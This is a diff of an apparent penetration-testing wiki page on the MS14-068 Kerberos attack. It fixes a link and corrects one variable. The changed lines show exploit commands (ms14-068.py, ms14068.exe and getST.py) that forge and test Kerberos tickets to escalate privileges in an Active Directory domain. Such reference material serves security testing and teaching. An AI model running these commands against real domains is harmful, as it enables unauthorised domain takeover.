@@ -51,7 +51,7 @@ ms14-068.py -u 'BASICUSER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'BASICUSER_SID' -d 'DO
 ms14-068.py -u 'BASICUSER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'BASICUSER_SID' -d 'DOMAIN_CONTROLLER'
 ```
 
-Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with \[pass-the-ticket]\(. An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python).
+Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with [pass-the-ticket](/ad/movement/kerberos/pass-the/ptt). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python).
 
 ```bash
 getST.py -k -no-pass -spn 'any_valid_spn' $DOMAIN_FQDN/$USER
@@ -112,7 +112,7 @@ ms14068.exe /domain:$domain /user:$user /password:$password /kdc:$VULN_KDC_FQDN
 # with an NT hash
 # AES-128 and AES-256 keys are also usable with /aes128 and /aes256 respectively
 # note that automatic discovery of the user SID is not possible when using hash 
-ms14068.exe /domain:$domain /user:$user /key:$krbtgt_NThash /sid:$DomainSID /rid:$userRelativeID /kdc:$KDC_FQDN
+ms14068.exe /domain:$domain /user:$user /key:$USER_NThash /sid:$DomainSID /rid:$userRelativeID /kdc:$KDC_FQDN
 ```
 
 </Tab>
